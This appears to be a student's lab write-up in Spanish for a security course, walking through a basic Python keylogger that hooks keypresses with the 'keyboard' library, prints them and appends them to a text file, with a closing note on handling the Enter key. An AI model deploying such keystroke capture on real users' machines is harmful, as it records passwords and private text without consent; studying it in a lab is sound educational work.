# SI_T5_P1

## Práctica keylogger

Lo primero que hay que hacer es poner el siguiente comando para importar la librería.

 ```python
import keyboard
 ```

Ahora hay que crear una función que te registre y te imprima las teclas.

1. Creo la función llamada "registrar_pulsaciones" con el parámetro "event"
2. A continuación, creo la variable tecla que me guarde en una cadena las teclas que vaya pulsando con el "event.name"
3. Y por último hago que se imrpima las teclas que pulso con "print"

 ```python
def registrar_pulsaciones(event):
    tecla = str(event.name)
    print(tecla)
 ```
    
Debajo de la función creo un if para que me sustituya la palabra 'space' por un espacio.

 ```python
if tecla == "space":
        tecla = " "
 ```

Una vez que ya nos está registrando las pulsacines tenemos que pasarlo a un txt para que se guarde.

 ```python
with open("registro.txt", 'a') as log_file:
        log_file.write(tecla)
 ```

Por último llamo a la función para que se ejecute y le digo que se mentenga funcionando el proceso con el "keyboard.wait()"

 ```python
keyboard.on_press(registrar_pulsaciones) 
keyboard.wait()
 ```

## Áreas de mejora
Una de las cosas que se podía mejorar en mi keylogger sería que al pulsar la tecla enter no se imprima "enter" sino que baje directamente a la columna de abajo.